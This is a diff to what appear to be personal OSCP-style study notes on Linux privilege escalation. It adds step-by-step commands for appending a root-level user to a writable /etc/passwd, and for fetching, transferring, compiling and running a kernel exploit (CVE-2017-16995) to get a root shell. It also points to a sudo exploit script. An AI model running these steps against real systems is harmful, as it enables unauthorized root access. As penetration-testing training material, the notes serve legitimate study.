@@ -1578,6 +1578,7 @@ linPEAS.sh
 LinEnum.sh
 linuxprivchecker.py
 unix-privesc-check
+./unix-privesc-check > output.txt
 Mestaploit: multi/recon/local_exploit_suggester
 ```
 
@@ -1629,7 +1630,28 @@ mount -o rw <targetIP>:<share-location> <directory path we created>
 #Now create a binary there
 chmod +x <binary>
 ```
----
+## Writable /etc/passwd file
+```bash
+>ls -l /etc/passwd
+-rw-rw-rw- 1 root root 1370 Apr 12 16:44 /etc/passwd (#Write permission)
+>openssl passwd ashok
+DLYJ9ZDE6uY5o
+>echo "ashok:DLYJ9ZDE6uY5o:0:0:root:/root:/bin/bash" >> /etc/passwd
+>su ashok(#password is also ashok, switch directory to ashok get the flag)
+```
+## Exploiting Kernel Vulnerabilities
+```bash
+cat /etc/issue (Ubuntu 16.04.4 LTS \n \l)
+uname -a Linux ubuntu-privesc 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux arch (X86_64)
+kali>searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
+kali>cp /usr/share/exploitdb/exploits/linux/local/45010.c .
+kali>head 45010.c -n 20
+kali>mv 45010.c cve-2017-16995.c
+kali>scp cve-2017-16995.c joe@192.168.123.216: (Transfer target machine)
+>gcc cve-2017-16995.c -o cve-2017-16995
+>file cve-2017-16995
+>./cve-2017-16995(Got root shell)
+```
 ## CVE - Linux
 CVE-2021-3156 with sudo version, Sudo version 1.8.31 (OSCP - Relia) <a href="https://github.com/ashok5141/OSCP/blob/main/Linux/exploit_nss.py">MyGit</a></br> 
 https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py
@@ -1639,7 +1661,7 @@ https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py
 >./exploit_nss.py (#Got roo shell)
 
 ```
-
+---
 # Post Exploitation
 
 > This is more windows specific as exam specific.
